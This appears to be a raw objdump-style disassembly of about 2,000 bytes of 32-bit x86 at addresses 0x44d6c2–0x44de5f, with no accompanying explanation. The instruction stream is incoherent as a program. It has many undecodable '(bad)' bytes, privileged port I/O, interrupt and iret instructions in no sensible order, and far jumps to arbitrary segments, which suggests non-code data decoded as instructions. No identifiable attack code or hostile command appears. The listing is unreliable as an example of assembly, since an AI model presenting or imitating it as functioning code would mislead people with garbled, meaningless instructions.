  44d6c2:	and    eax,0xb0739851
  44d6c7:	mov    ebp,0x24b891bf
  44d6cc:	out    dx,eax
  44d6cd:	shl    DWORD PTR [ebx-0x1ba87aa1],0xf0
  44d6d4:	add    eax,0x9535ee3e
  44d6d9:	mov    al,ds:0x53dbcf50
  44d6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d6df:	test   eax,0x94b4932b
  44d6e4:	push   eax
  44d6e5:	pop    ebp
  44d6e6:	xchg   esp,eax
  44d6e7:	in     al,dx
  44d6e8:	inc    esi
  44d6e9:	sbb    BYTE PTR [ecx-0x5ba97a6c],dh
  44d6ef:	cli    
  44d6f0:	ja     0x44d727
  44d6f2:	mov    cl,0xab
  44d6f4:	xor    DWORD PTR [edi+0x63e1eb53],edx
  44d6fa:	push   edi
  44d6fb:	lds    ecx,FWORD PTR [ecx]
  44d6fd:	mov    edx,0x746ab4b1
  44d702:	rcl    DWORD PTR [ebx+0x77],cl
  44d705:	pop    ecx
  44d706:	mov    BYTE PTR [ebp-0x15c4bbe7],ch
  44d70c:	mov    cl,cl
  44d70e:	ror    BYTE PTR [edi+0x34b3396a],0xb8
  44d715:	cld    
  44d716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d717:	pushf  
  44d718:	add    eax,0x94e9b75f
  44d71d:	and    eax,DWORD PTR [ebx+0x5]
  44d720:	(bad)  
  44d721:	jmp    0xa7790522
  44d726:	sbb    edx,ecx
  44d728:	inc    ebx
  44d729:	iret   
  44d72a:	jns    0x44d6d3
  44d72c:	lods   eax,DWORD PTR gs:[esi]
  44d72e:	scas   eax,DWORD PTR es:[edi]
  44d72f:	in     eax,dx
  44d730:	sbb    eax,edx
  44d732:	sahf   
  44d733:	mov    ebp,fs
  44d735:	xor    BYTE PTR [edx],ah
  44d737:	push   edx
  44d738:	in     al,0xd3
  44d73a:	mov    dl,0x34
  44d73c:	imul   edi,DWORD PTR [esi+0x2ee56c6b],0x3b14f037
  44d746:	dec    esi
  44d747:	xor    al,0x1f
  44d749:	cmp    DWORD PTR [eax-0xebdaa2b],esi
  44d74f:	or     BYTE PTR [edi],bl
  44d751:	lahf   
  44d752:	sub    edx,DWORD PTR [eax+ebp*1-0x4a]
  44d756:	fisub  WORD PTR [edi+ebp*2-0x5f]
  44d75a:	(bad)  
  44d75b:	adc    ecx,DWORD PTR [edi-0x2b]
  44d75e:	popf   
  44d75f:	es pop ds
  44d761:	inc    ebp
  44d762:	jno    0x44d7d6
  44d764:	push   esp
  44d765:	not    DWORD PTR [ecx]
  44d767:	add    DWORD PTR [ebp+0x4ef0544b],0x6b64a853
  44d771:	mov    ecx,0x71b996fa
  44d776:	addr16 xchg edx,eax
  44d778:	sbb    ebp,DWORD PTR [eax]
  44d77a:	mov    eax,cs:0x302d8fd6
  44d780:	or     eax,0x7e3a07b1
  44d785:	cmp    al,0xf9
  44d787:	fwait
  44d788:	test   DWORD PTR [edi],0xd2a1f2ee
  44d78e:	je     0x44d7c7
  44d790:	pushf  
  44d791:	sub    bl,0x4
  44d794:	repnz test eax,0x5c55e718
  44d79a:	jbe    0x44d785
  44d79c:	fcmovne st,st(1)
  44d79e:	push   ebp
  44d79f:	mov    ds:0xd2d3b922,al
  44d7a4:	mov    cl,0xaf
  44d7a6:	add    al,0x63
  44d7a8:	into   
  44d7a9:	mov    eax,ds:0x457365db
  44d7ae:	or     eax,0xe0524f44
  44d7b3:	mov    eax,ds:0x44b21d6e
  44d7b8:	or     ebx,DWORD PTR [edx+0x60]
  44d7bb:	sti    
  44d7bc:	mov    ch,0x6f
  44d7be:	pushf  
  44d7bf:	call   0xdf106096
  44d7c4:	and    bl,BYTE PTR [ecx-0x15bb9446]
  44d7ca:	in     al,0x86
  44d7cc:	fs xchg ebp,eax
  44d7ce:	int    0x32
  44d7d0:	ja     0x44d76b
  44d7d2:	and    edx,DWORD PTR [esi+0x210a5ce]
  44d7d8:	add    al,0x8b
  44d7da:	jg     0x44d850
  44d7dc:	or     al,0x2b
  44d7de:	sbb    ebx,DWORD PTR [esi]
  44d7e0:	sbb    eax,0x2d128551
  44d7e5:	test   eax,0x9fb540c6
  44d7ea:	cmp    ecx,ebp
  44d7ec:	loop   0x44d7eb
  44d7ee:	mov    eax,0x9abce71f
  44d7f3:	lods   eax,DWORD PTR ds:[esi]
  44d7f4:	sbb    eax,0x6aeb8980
  44d7f9:	bound  esp,QWORD PTR [esi+0x3]
  44d7fc:	aad    0xe0
  44d7fe:	jmp    0xf998:0x183642e6
  44d805:	pop    ecx
  44d806:	fwait
  44d807:	aas    
  44d808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d809:	mov    ds:0xf852f79f,al
  44d80e:	push   esi
  44d80f:	into   
  44d810:	jne    0x44d86b
  44d812:	or     eax,0xb365c2ec
  44d817:	test   DWORD PTR cs:[ecx-0x6547221d],0x4ccfa32f
  44d822:	test   BYTE PTR [ebp-0x29],ch
  44d825:	and    ah,0xa7
  44d828:	adc    eax,0xeef8f6f
  44d82d:	mov    esi,0x692291b9
  44d832:	jle    0x44d848
  44d834:	js     0x44d846
  44d836:	lds    edi,FWORD PTR [edi]
  44d838:	cld    
  44d839:	mov    esp,0x740f8fbb
  44d83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d83f:	sti    
  44d840:	and    DWORD PTR ds:0x491d9586,esp
  44d846:	popf   
  44d847:	jmp    0x44d848
  44d849:	cwde   
  44d84a:	or     ch,BYTE PTR [edx+0x7dcc0e1e]
  44d850:	pop    edx
  44d851:	mov    ebx,DWORD PTR [eax+0x5d]
  44d854:	sub    edi,DWORD PTR [esi-0x16dd19f2]
  44d85a:	jmp    0xcd87a4a3
  44d85f:	cmp    al,0x95
  44d861:	and    al,0xf
  44d863:	mov    WORD PTR [edi],ss
  44d865:	sar    edx,1
  44d867:	int3   
  44d868:	or     BYTE PTR [eax+0x791f03dc],0xc1
  44d86f:	inc    ebp
  44d870:	out    dx,al
  44d871:	jbe    0x44d862
  44d873:	mov    esi,0x69f2dae3
  44d878:	xchg   esi,eax
  44d879:	adc    DWORD PTR [ebx+0x55],esp
  44d87c:	xchg   esp,eax
  44d87d:	sahf   
  44d87e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d87f:	sti    
  44d880:	aam    0xc8
  44d882:	and    eax,0xbd97498d
  44d887:	mov    ah,0x1e
  44d889:	xchg   ebp,eax
  44d88a:	sub    DWORD PTR [esi+0x25],edi
  44d88d:	jmp    0xb31fbe45
  44d892:	popa   
  44d893:	mov    edi,0x109ec948
  44d898:	pop    ds
  44d899:	add    al,0x52
  44d89b:	in     eax,dx
  44d89c:	and    ah,BYTE PTR [edx]
  44d89e:	test   eax,0x5c81ef96
  44d8a3:	daa    
  44d8a4:	inc    ebp
  44d8a5:	shr    eax,1
  44d8a7:	retf   
  44d8a8:	xor    eax,0x1b2eb05c
  44d8ad:	mov    DWORD PTR [esi],esi
  44d8af:	pop    ebx
  44d8b0:	add    ah,BYTE PTR [esi-0x645092ef]
  44d8b6:	retf   
  44d8b7:	stos   BYTE PTR es:[edi],al
  44d8b8:	out    dx,eax
  44d8b9:	pushf  
  44d8ba:	out    dx,al
  44d8bb:	jnp    0x44d85d
  44d8bd:	jp     0x44d8fd
  44d8bf:	push   cs
  44d8c0:	and    al,0x72
  44d8c2:	and    esp,DWORD PTR [ebp-0x3a8b30df]
  44d8c8:	push   es
  44d8c9:	adc    bl,BYTE PTR [esi+esi*2-0x76]
  44d8cd:	fsub   DWORD PTR [esi-0x1526f0af]
  44d8d3:	out    dx,al
  44d8d4:	and    DWORD PTR [ecx+0x7c89b353],ecx
  44d8da:	mov    ah,0x27
  44d8dc:	adc    dh,BYTE PTR [ebp+0x5da8508b]
  44d8e2:	add    DWORD PTR [eax],edi
  44d8e4:	imul   ebx,DWORD PTR [ebp-0x15],0x919975a6
  44d8eb:	xor    eax,0x15b8d02d
  44d8f0:	int    0x30
  44d8f2:	mov    ecx,0x5caf551c
  44d8f7:	in     eax,0xe7
  44d8f9:	push   ecx
  44d8fa:	sub    BYTE PTR [ecx],dh
  44d8fc:	and    eax,0x9d200999
  44d901:	das    
  44d902:	mov    esi,0x3ea44257
  44d907:	xor    esi,edx
  44d909:	xchg   esp,eax
  44d90a:	mov    cl,0xc
  44d90c:	and    al,0x19
  44d90e:	les    esp,FWORD PTR [esi-0x6f]
  44d911:	mov    ecx,0x809ea4d
  44d916:	lods   eax,DWORD PTR ds:[esi]
  44d917:	cmp    BYTE PTR [esi],0x99
  44d91a:	fwait
  44d91b:	daa    
  44d91c:	retf   0x3810
  44d91f:	xchg   ebp,eax
  44d920:	sbb    DWORD PTR [ecx],ebx
  44d922:	mov    esp,0x7d8dbff9
  44d927:	stc    
  44d928:	(bad)  
  44d929:	scas   al,BYTE PTR es:[edi]
  44d92a:	retf   
  44d92b:	xchg   ecx,eax
  44d92c:	hlt    
  44d92d:	ins    DWORD PTR es:[edi],dx
  44d92e:	call   0xbee3f956
  44d933:	dec    ebx
  44d934:	sub    DWORD PTR [ecx-0x67e40120],ebx
  44d93a:	ins    DWORD PTR es:[edi],dx
  44d93b:	mov    dh,0x22
  44d93d:	dec    ebx
  44d93e:	adc    eax,0x9903d55d
  44d943:	out    dx,al
  44d944:	inc    edx
  44d945:	xchg   ebp,eax
  44d946:	push   edi
  44d947:	mov    bh,0xd1
  44d949:	test   eax,0x58868901
  44d94e:	test   BYTE PTR [esi+0x15],cl
  44d951:	mov    WORD PTR [ebp-0x55],?
  44d954:	dec    ebp
  44d955:	loope  0x44d974
  44d957:	mov    bh,BYTE PTR [edi+0x5a]
  44d95a:	loope  0x44d970
  44d95c:	cdq    
  44d95d:	(bad)  
  44d95e:	cmp    eax,0xb72801d4
  44d963:	mov    ah,0x78
  44d965:	pop    edi
  44d966:	push   esp
  44d967:	arpl   WORD PTR ds:0xa8f42c1f,sp
  44d96d:	push   edi
  44d96e:	imul   esi,DWORD PTR [edx],0xc
  44d971:	jmp    0xd147:0xa4e2e332
  44d978:	call   0xb55c1e5c
  44d97d:	jmp    0x44d967
  44d97f:	jmp    0x44d98d
  44d981:	xchg   edx,eax
  44d982:	inc    edx
  44d983:	adc    edx,DWORD PTR [ecx-0x50]
  44d986:	test   DWORD PTR [esi-0x27],ebx
  44d989:	bound  edi,QWORD PTR [ebx+0x14247384]
  44d98f:	inc    ebp
  44d990:	adc    eax,0x4aef6b7c
  44d995:	jae    0x44d9b7
  44d997:	arpl   WORD PTR [esi-0x196aa0e4],sp
  44d99d:	add    BYTE PTR [eax],bl
  44d99f:	in     al,0x1b
  44d9a1:	jo     0x44d960
  44d9a3:	in     eax,0xa9
  44d9a5:	int    0xe7
  44d9a7:	dec    edi
  44d9a8:	xchg   ebx,eax
  44d9a9:	mov    ch,0x98
  44d9ab:	and    al,0xad
  44d9ad:	lahf   
  44d9ae:	into   
  44d9af:	and    DWORD PTR [ecx+ebp*2],esp
  44d9b2:	ja     0x44d9a6
  44d9b4:	add    bh,dh
  44d9b6:	pop    edi
  44d9b7:	dec    eax
  44d9b8:	imul   ebx,DWORD PTR [ebp-0x5ac265c5],0x33b30839
  44d9c2:	xchg   eax,ecx
  44d9c4:	pop    eax
  44d9c5:	pushf  
  44d9c6:	xchg   ebx,eax
  44d9c7:	js     0x44da2d
  44d9c9:	nop
  44d9ca:	test   eax,0xba2dda3
  44d9cf:	ja     0x44d9a8
  44d9d1:	mov    edi,0x9e431ccf
  44d9d6:	add    DWORD PTR [edx-0x49],edi
  44d9d9:	ret    
  44d9da:	and    ah,BYTE PTR [ebp+0x23]
  44d9dd:	aas    
  44d9de:	cmp    al,0xdd
  44d9e0:	sub    eax,0x2898bd3
  44d9e5:	lahf   
  44d9e6:	sbb    bh,BYTE PTR [ecx+0x23]
  44d9e9:	ror    DWORD PTR [ebx+ebp*4+0x22],cl
  44d9ed:	dec    ecx
  44d9ee:	xchg   esi,eax
  44d9ef:	sub    DWORD PTR [ecx+0x28f6b3eb],esi
  44d9f5:	cwde   
  44d9f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d9f7:	sub    BYTE PTR [ecx],bl
  44d9f9:	mov    DWORD PTR [edx+0x5c6723d1],esi
  44d9ff:	dec    eax
  44da00:	mov    edi,0x7410a185
  44da05:	cmp    BYTE PTR [ebx-0x13],0xb4
  44da09:	fistp  QWORD PTR [edi-0x19b0b45c]
  44da0f:	lods   al,BYTE PTR ds:[esi]
  44da10:	gs xor al,0xe4
  44da13:	out    0x41,al
  44da15:	xchg   esi,eax
  44da16:	or     ch,dl
  44da18:	inc    ebp
  44da19:	cmp    dh,BYTE PTR [ebx]
  44da1b:	pop    ss
  44da1c:	push   eax
  44da1d:	test   eax,0x95dbf600
  44da22:	dec    eax
  44da23:	push   es
  44da24:	mov    bl,0x8
  44da26:	mov    bh,0x0
  44da28:	and    eax,0x60ebf14f
  44da2d:	fsub   st(3),st
  44da2f:	dec    ebp
  44da30:	pop    ds
  44da31:	imul   esp,DWORD PTR [eax-0x2],0xaa9675c5
  44da38:	into   
  44da39:	fwait
  44da3a:	jmp    0x44dab6
  44da3c:	test   eax,0xa460d3
  44da41:	ror    DWORD PTR [esi],1
  44da43:	nop
  44da44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44da45:	frstor [ebx+0x321a75ac]
  44da4b:	jmp    0x44da8e
  44da4d:	jmp    0x44da66
  44da4f:	outs   dx,BYTE PTR ds:[esi]
  44da50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44da51:	pop    edi
  44da52:	sub    al,0xea
  44da54:	in     al,dx
  44da55:	popf   
  44da56:	or     BYTE PTR [edx+0x1c],0xa9
  44da5a:	cli    
  44da5b:	int    0xa4
  44da5d:	jo     0x44dab5
  44da5f:	jae    0x44d9ea
  44da61:	lods   eax,DWORD PTR ds:[esi]
  44da62:	or     esp,eax
  44da64:	dec    edx
  44da65:	jnp    0x44da0c
  44da67:	jns    0x44da6b
  44da69:	fidivr DWORD PTR [ecx+0x45]
  44da6c:	push   ds
  44da6d:	pop    ecx
  44da6e:	stos   DWORD PTR es:[edi],eax
  44da6f:	xchg   BYTE PTR [edi],bh
  44da71:	bound  ebx,QWORD PTR [edx]
  44da73:	scas   al,BYTE PTR es:[edi]
  44da74:	dec    ecx
  44da75:	mov    al,ds:0xc547180b
  44da7a:	or     al,0x1c
  44da7c:	mov    ds:0xe33963a5,al
  44da81:	push   esp
  44da82:	mov    cl,0xb4
  44da84:	aam    0x84
  44da86:	xlat   BYTE PTR ds:[ebx]
  44da87:	je     0x44da56
  44da89:	cdq    
  44da8a:	sbb    ebx,ecx
  44da8c:	repz loop 0x44db07
  44da8f:	dec    esp
  44da90:	scas   al,BYTE PTR es:[edi]
  44da91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44da92:	mov    ds:0xb0a92c02,al
  44da97:	mov    ah,0x57
  44da99:	mov    BYTE PTR [edx],ah
  44da9b:	(bad)  
  44da9d:	mov    cl,0x42
  44da9f:	icebp  
  44daa0:	les    ebx,FWORD PTR [edx-0x42]
  44daa3:	jno    0x44dac7
  44daa5:	mov    ecx,0xc97cb442
  44daaa:	xlat   BYTE PTR ds:[ebx]
  44daab:	lea    ebp,[edx-0x5e]
  44daae:	mov    edx,DWORD PTR [edi]
  44dab0:	push   esi
  44dab1:	push   ebx
  44dab2:	inc    edx
  44dab3:	xor    ch,BYTE PTR ds:0x251b72b
  44dab9:	cmc    
  44daba:	mov    al,0x24
  44dabc:	fadd   DWORD PTR [eax-0xdea651c]
  44dac2:	xchg   ebp,eax
  44dac3:	jmp    0x44dabc
  44dac5:	and    al,BYTE PTR [edi+0x6d]
  44dac8:	push   esp
  44dac9:	stc    
  44daca:	jno    0x44daa6
  44dacc:	seto   BYTE PTR [esi-0x2df620de]
  44dad3:	out    0x85,al
  44dad5:	cli    
  44dad6:	mov    edx,0x5b730af1
  44dadb:	mov    eax,ds:0x6233b91a
  44dae0:	bnd jmp 0x2857e51e
  44dae6:	in     eax,0x1c
  44dae8:	mov    ch,0x2f
  44daea:	sbb    ch,cl
  44daec:	xchg   DWORD PTR [ecx+0x45],edi
  44daef:	loopne 0x44db11
  44daf1:	jmp    0x58396bff
  44daf6:	mov    DWORD PTR [edx],esp
  44daf8:	xlat   BYTE PTR ds:[ebx]
  44daf9:	fwait
  44dafa:	sub    ebp,DWORD PTR [ebp-0x364a9a34]
  44db00:	cmp    DWORD PTR [ebx],esi
  44db02:	sar    DWORD PTR [ecx-0x4b4d2268],1
  44db08:	mov    ds:0x5ab866a,al
  44db0d:	addr16 es in al,dx
  44db10:	cmp    eax,0xcde66d88
  44db15:	sub    al,0x6d
  44db17:	xor    eax,0xabeb9b51
  44db1c:	and    BYTE PTR [ebp-0x58ed0679],ch
  44db22:	dec    ebx
  44db23:	adc    bh,BYTE PTR [edi+0x7a13b50b]
  44db29:	push   cs
  44db2a:	pusha  
  44db2b:	add    DWORD PTR [eax+ebp*4],edx
  44db2e:	cmp    ebx,DWORD PTR [edx+0x26]
  44db31:	fsub   DWORD PTR [ebp-0x13a97528]
  44db37:	xchg   ecx,eax
  44db38:	jmp    0x44db1d
  44db3a:	cdq    
  44db3b:	sub    al,0xaa
  44db3d:	mov    al,0xe1
  44db3f:	aam    0x84
  44db41:	(bad)  
  44db42:	mov    edi,0x26ec823d
  44db47:	test   DWORD PTR [ecx*1-0x5fc02ee9],ebx
  44db4e:	sti    
  44db4f:	dec    ebx
  44db50:	cmp    BYTE PTR [esi-0x2b],ah
  44db53:	ins    BYTE PTR es:[edi],dx
  44db54:	addr16 adc eax,0x15c04454
  44db5a:	mov    edi,0x658eda44
  44db5f:	loope  0x44db47
  44db61:	and    ecx,ebx
  44db63:	and    DWORD PTR [eax-0x774e77ca],ecx
  44db69:	sbb    eax,0x7065f232
  44db6e:	pushf  
  44db6f:	cmc    
  44db70:	mov    ah,0x40
  44db72:	adc    al,0x92
  44db74:	pusha  
  44db75:	or     al,0xb1
  44db77:	je     0x44dbce
  44db79:	cdq    
  44db7a:	mov    esp,DWORD PTR [eax-0x18]
  44db7d:	dec    ebp
  44db7e:	mov    ecx,0x15f9a97e
  44db83:	fadd   DWORD PTR [edi+0x29]
  44db86:	shr    BYTE PTR [ebx],1
  44db88:	enter  0x604f,0xff
  44db8c:	push   ebp
  44db8d:	hlt    
  44db8e:	dec    edi
  44db8f:	jb     0x44db86
  44db91:	jmp    DWORD PTR [edx-0x5c496213]
  44db97:	push   edi
  44db98:	push   ss
  44db99:	cdq    
  44db9a:	loopne 0x44dbce
  44db9c:	int    0x99
  44db9e:	xor    dh,BYTE PTR [ecx+0x3ffba208]
  44dba4:	mov    al,0x39
  44dba6:	pop    ebp
  44dba7:	mov    ah,0x9f
  44dba9:	fadd   QWORD PTR [ecx]
  44dbab:	mov    ecx,0x4c368918
  44dbb0:	inc    ecx
  44dbb1:	inc    ecx
  44dbb2:	icebp  
  44dbb3:	mov    dl,0x8c
  44dbb5:	fwait
  44dbb6:	sbb    edi,DWORD PTR ds:0x844db50c
  44dbbc:	sub    DWORD PTR [edx],edx
  44dbbe:	repz mov al,0xc2
  44dbc1:	push   esi
  44dbc2:	mov    ebx,0x9fc0e604
  44dbc7:	sahf   
  44dbc8:	(bad)
  44dbcb:	in     eax,0x9f
  44dbcd:	push   ds
  44dbce:	mov    bh,0x82
  44dbd0:	xchg   ebx,eax
  44dbd1:	jns    0x44db9a
  44dbd3:	xchg   esi,eax
  44dbd4:	jg     0x44dbc4
  44dbd6:	pop    esi
  44dbd7:	push   ecx
  44dbd8:	mov    esp,esi
  44dbda:	mov    dl,0xc0
  44dbdc:	xchg   esi,eax
  44dbdd:	retf   0xa235
  44dbe0:	and    ebp,DWORD PTR [ecx]
  44dbe2:	pop    ebx
  44dbe3:	out    dx,al
  44dbe4:	jg     0x44dbd3
  44dbe6:	(bad)  
  44dbe7:	mov    ds:0xe5f3f1a1,al
  44dbec:	xchg   ebp,eax
  44dbed:	jge    0x44dbdf
  44dbef:	repz pop ecx
  44dbf1:	mov    eax,0x8cd53a42
  44dbf6:	xor    al,0xee
  44dbf8:	sbb    eax,0x1a6de3e5
  44dbfd:	cdq    
  44dbfe:	jge    0x44db9b
  44dc00:	int3   
  44dc01:	add    DWORD PTR [esp+eax*8-0x7e],0xffffff8c
  44dc06:	mov    WORD PTR [esi+0x35],?
  44dc09:	stos   BYTE PTR es:[edi],al
  44dc0a:	ret    
  44dc0b:	mov    al,ds:0x12b6622b
  44dc10:	(bad)  
  44dc11:	jl     0x44db93
  44dc13:	paddd  mm2,QWORD PTR [ebx-0x5ae2d5d5]
  44dc1a:	xchg   BYTE PTR [ebx+edi*2+0x69e2cba1],al
  44dc21:	aad    0xfc
  44dc23:	xchg   BYTE PTR [edx],bh
  44dc25:	sub    dh,BYTE PTR [ecx-0x4b]
  44dc28:	in     eax,0x81
  44dc2a:	mov    esi,0x7d7ccf84
  44dc2f:	pop    eax
  44dc30:	xor    eax,0x4e6bb66
  44dc35:	sbb    ah,BYTE PTR [ebx-0x62766f80]
  44dc3b:	pushf  
  44dc3c:	cmp    eax,0x2923ccea
  44dc41:	and    al,0xbd
  44dc43:	xchg   bp,ax
  44dc45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dc46:	stos   DWORD PTR es:[edi],eax
  44dc47:	je     0x44dc05
  44dc49:	repnz xchg ebp,eax
  44dc4b:	out    dx,al
  44dc4c:	jge    0x44dc60
  44dc4e:	inc    edx
  44dc4f:	mov    ch,0xc2
  44dc51:	cmp    al,0xbd
  44dc53:	adc    al,0x1a
  44dc55:	bound  esp,QWORD PTR [ebx]
  44dc57:	mov    edi,0xe75cfdf5
  44dc5c:	or     al,0xd2
  44dc5e:	push   0x897ce749
  44dc63:	jl     0x44dcb3
  44dc65:	push   ds
  44dc66:	(bad)  
  44dc67:	adc    eax,0x50689480
  44dc6c:	in     al,dx
  44dc6d:	arpl   WORD PTR [ebp+0x14add510],di
  44dc73:	bnd jb 0x44dcba
  44dc76:	popf   
  44dc77:	gs jge 0x44dc21
  44dc7a:	pop    ss
  44dc7b:	dec    edx
  44dc7c:	mov    cl,0xe7
  44dc7e:	mov    esi,0xcf4b6864
  44dc83:	and    al,0x45
  44dc85:	fisub  WORD PTR [edx-0x3a578e11]
  44dc8b:	aas    
  44dc8c:	sbb    eax,0x9e5c1c89
  44dc91:	add    ah,ah
  44dc93:	cli    
  44dc94:	jns    0x44dc39
  44dc96:	sti    
  44dc97:	aad    0x2d
  44dc99:	idiv   ebx
  44dc9b:	data16 test ch,ch
  44dc9e:	lods   eax,DWORD PTR ds:[esi]
  44dc9f:	pushf  
  44dca0:	xor    DWORD PTR [esi],esp
  44dca2:	mov    edi,0x827e1174
  44dca7:	leave  
  44dca8:	fs sti 
  44dcaa:	int    0xe8
  44dcac:	and    BYTE PTR [ebp-0x280961c5],bl
  44dcb2:	mov    edx,0x32c9fa00
  44dcb7:	(bad)  
  44dcb8:	fsub   DWORD PTR [edi-0x59c55241]
  44dcbe:	jae    0x44dc80
  44dcc0:	push   esi
  44dcc1:	cmc    
  44dcc2:	or     BYTE PTR [eax],cl
  44dcc4:	inc    edi
  44dcc5:	ret    0x2b31
  44dcc8:	sub    eax,0xe46ab0a6
  44dccd:	and    edi,0xbaa05ce4
  44dcd3:	mov    dh,0x50
  44dcd5:	sbb    DWORD PTR [ebx-0x45],eax
  44dcd8:	inc    ebp
  44dcd9:	pushf  
  44dcda:	cdq    
  44dcdb:	jmp    0x44dce0
  44dcdd:	lods   eax,DWORD PTR ds:[esi]
  44dcde:	cmp    al,0x30
  44dce0:	push   ss
  44dce1:	sub    BYTE PTR [ecx],al
  44dce3:	cmp    al,0x60
  44dce5:	jo     0x44dca5
  44dce7:	test   BYTE PTR [eax+ecx*8-0x44fb3ad9],dl
  44dcee:	sbb    ebp,DWORD PTR [edi+0x8]
  44dcf1:	outs   dx,DWORD PTR ds:[esi]
  44dcf2:	imul   BYTE PTR [esi+0x6d72251a]
  44dcf8:	and    ch,BYTE PTR [ecx]
  44dcfa:	imul   edi,DWORD PTR [edx],0xe290f319
  44dd00:	bound  esp,QWORD PTR [eax-0x6ea99a45]
  44dd06:	pop    ebx
  44dd07:	fisttp QWORD PTR [ebp+0xaaae453]
  44dd0d:	xchg   edi,eax
  44dd0e:	mov    edi,0x4a23bdf4
  44dd13:	add    ah,BYTE PTR [ebx-0x5a]
  44dd16:	jnp    0x44dd07
  44dd18:	push   edi
  44dd19:	ins    DWORD PTR es:[edi],dx
  44dd1a:	mov    dl,0xac
  44dd1c:	fld    TBYTE PTR [ebp+0x1d]
  44dd1f:	pop    eax
  44dd20:	nop
  44dd21:	jo     0x44dcdd
  44dd23:	je     0x44dd3f
  44dd25:	aam    0xa
  44dd27:	icebp  
  44dd28:	mov    ch,0xb2
  44dd2a:	mov    al,0xf1
  44dd2c:	push   0xffffffaa
  44dd2e:	mov    ds,eax
  44dd30:	sub    al,0x9
  44dd32:	lds    eax,FWORD PTR [esi]
  44dd34:	push   DWORD PTR [esi+eiz*1+0x6aa587bb]
  44dd3b:	test   eax,0x913ba8bb
  44dd40:	push   es
  44dd41:	into   
  44dd42:	cmp    BYTE PTR [esi],dl
  44dd44:	mov    ecx,0x776c542a
  44dd49:	fdiv   DWORD PTR [ebx+0xdbd4c4]
  44dd4f:	sbb    bh,dl
  44dd51:	dec    ebp
  44dd52:	call   0x1b1b:0x52b2ed3
  44dd59:	out    0xb4,eax
  44dd5b:	jp     0x44ddda
  44dd5d:	mov    eax,0xe1057ea5
  44dd62:	mov    dl,0x14
  44dd64:	inc    ebx
  44dd65:	int3   
  44dd66:	mov    eax,ds:0x7b9ad5ca
  44dd6b:	xchg   edx,eax
  44dd6c:	mov    ebx,DWORD PTR [eax+eiz*4-0x2d7116a1]
  44dd73:	in     al,0x8e
  44dd75:	xor    ah,dl
  44dd77:	hlt    
  44dd78:	and    al,0xfa
  44dd7a:	cli    
  44dd7b:	jmp    0xae45:0xe99503cf
  44dd82:	and    esi,eax
  44dd84:	(bad)  
  44dd85:	cmp    bl,BYTE PTR [edx-0xcf6e394]
  44dd8b:	pop    eax
  44dd8c:	gs in  al,0xc0
  44dd8f:	jp     0x44dda8
  44dd91:	into   
  44dd92:	imul   edi,DWORD PTR [ebp+0x53],0x7f
  44dd96:	cmp    al,0xaf
  44dd98:	cs jne 0x44ddf6
  44dd9b:	call   0xf3ac48fd
  44dda0:	test   al,0xec
  44dda2:	mov    cl,BYTE PTR [ecx+0x9]
  44dda5:	or     eax,0x508578bb
  44ddaa:	mov    bl,0x14
  44ddac:	pop    es
  44ddad:	stos   DWORD PTR es:[edi],eax
  44ddae:	out    dx,eax
  44ddaf:	cdq    
  44ddb0:	xchg   ebx,eax
  44ddb1:	jmp    0x1f3ec089
  44ddb6:	out    0x1f,al
  44ddb8:	in     al,dx
  44ddb9:	adc    al,0xbc
  44ddbb:	push   esp
  44ddbc:	push   esi
  44ddbd:	inc    esi
  44ddbe:	mov    ebx,0x449ae355
  44ddc3:	sti    
  44ddc4:	xchg   ecx,eax
  44ddc5:	sti    
  44ddc6:	or     DWORD PTR [ecx-0x3b49c505],0xffffffdc
  44ddcd:	neg    BYTE PTR [eax-0x1d]
  44ddd0:	cdq    
  44ddd1:	add    al,0xd9
  44ddd3:	jne    0x44dd81
  44ddd5:	nop
  44ddd6:	mov    cl,0x14
  44ddd8:	mov    dl,0x22
  44ddda:	pop    ecx
  44dddb:	hlt    
  44dddc:	adc    al,0xf6
  44ddde:	mov    dh,0x44
  44dde0:	mov    WORD PTR [ecx],ss
  44dde2:	ja     0x44de46
  44dde4:	ffree  st(1)
  44dde6:	cmp    al,0x8
  44dde8:	js     0x44de0f
  44ddea:	outs   dx,BYTE PTR ds:[si]
  44ddec:	sub    ah,BYTE PTR [eax-0x18985725]
  44ddf2:	rcl    BYTE PTR [ecx+0x25],1
  44ddf5:	xor    DWORD PTR [ebx+edx*1],ebp
  44ddf8:	imul   ebx,ebp,0x58
  44ddfb:	mov    eax,0x74bd28d1
  44de00:	sbb    DWORD PTR [ecx-0xe962465],edi
  44de06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44de07:	push   ds
  44de08:	sub    ah,BYTE PTR [eax+0x45bca6eb]
  44de0e:	in     al,0x1e
  44de10:	shl    ah,0x2
  44de13:	mov    DWORD PTR [ecx+0x4e],edx
  44de16:	mov    ebx,0xb4243b44
  44de1b:	bound  eax,QWORD PTR ds:0xe7ee4616
  44de21:	jnp    0x44de34
  44de23:	ins    DWORD PTR es:[edi],dx
  44de24:	push   ds
  44de25:	sub    edi,ecx
  44de27:	mov    cl,0xd
  44de29:	cdq    
  44de2a:	inc    ecx
  44de2b:	cdq    
  44de2c:	test   BYTE PTR ds:0x5bd5a58c,0x6e
  44de33:	and    bh,0x8a
  44de36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44de37:	out    dx,eax
  44de38:	and    al,0xf9
  44de3a:	add    BYTE PTR [edx+0xd],bh
  44de3d:	xchg   ecx,eax
  44de3e:	or     ebx,DWORD PTR [ecx]
  44de40:	jecxz  0x44ddc3
  44de42:	(bad)  [edx]
  44de44:	push   ds
  44de45:	mov    ds:0x9eed238b,eax
  44de4a:	(bad)  
  44de4b:	iret   
  44de4c:	das    
  44de4d:	and    BYTE PTR [edi],bh
  44de4f:	cld    
  44de50:	pop    edx
  44de51:	pop    edx
  44de52:	mov    esi,0x7b1376c4
  44de57:	inc    esp
  44de58:	cmc    
  44de59:	sbb    DWORD PTR [edi-0x17],esi
  44de5c:	es pop edi
  44de5e:	in     al,dx
  44de5f:	in     al,dx
